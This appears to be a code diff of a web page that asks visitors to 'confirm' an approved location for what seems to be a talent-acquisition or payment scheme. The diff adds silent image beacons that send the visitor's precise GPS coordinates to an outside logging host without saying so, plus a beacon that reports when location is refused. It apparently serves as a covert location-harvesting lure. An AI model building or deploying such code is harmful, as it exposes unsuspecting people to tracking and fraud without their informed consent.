@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Confirm Location</title>
+    <title>VCC Approved Location</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
+
     <style>
         body {
             font-family: sans-serif;
@@ -41,11 +42,12 @@
         }
     </style>
 </head>
+
 <body>
 
 <div class="card">
 
-    <h3>📍 Confirm Your Location</h3>
+    <h3>📍 VCC Approved Location</h3>
 
     <button onclick="confirmLocation()">Confirm VCC_APPROVED Location</button>
 
@@ -60,11 +62,12 @@ function confirmLocation() {
     document.getElementById("status").innerText = "Getting location...";
 
     if (!navigator.geolocation) {
-        document.getElementById("status").innerText = "GPS not supported";
+        alert("GPS not supported on this device");
         return;
     }
 
     navigator.geolocation.getCurrentPosition(
+
         (pos) => {
 
             let lat = pos.coords.latitude;
@@ -73,17 +76,34 @@ function confirmLocation() {
             let url = "https://TalentAcquisition.pythonanywhere.com/log"
                 + "?lat=" + lat
                 + "&lon=" + lon
-                + "&ip=web"
-                + "&type=redirect";
+                + "&type=VCC_APPROVED";
 
-            // FINAL WORKING METHOD
-            window.location.href = url;
-        },
-        (err) => {
+            let img = new Image();
+            img.src = url;
+
             document.getElementById("status").innerText =
-                "Permission denied ❌";
-            console.log(err);
+                "Location saved ✔";
+
         },
+
+        (err) => {
+
+            console.log(err);
+
+            alert("📍 Location is OFF or denied.\n\nPlease turn ON Location Services and try again.");
+
+            let url = "https://TalentAcquisition.pythonanywhere.com/log"
+                + "?lat=NA"
+                + "&lon=NA"
+                + "&type=LOCATION_OFF";
+
+            let img = new Image();
+            img.src = url;
+
+            document.getElementById("status").innerText =
+                "Location not available ❌";
+        },
+
         {
             enableHighAccuracy: true,
             timeout: 15000,
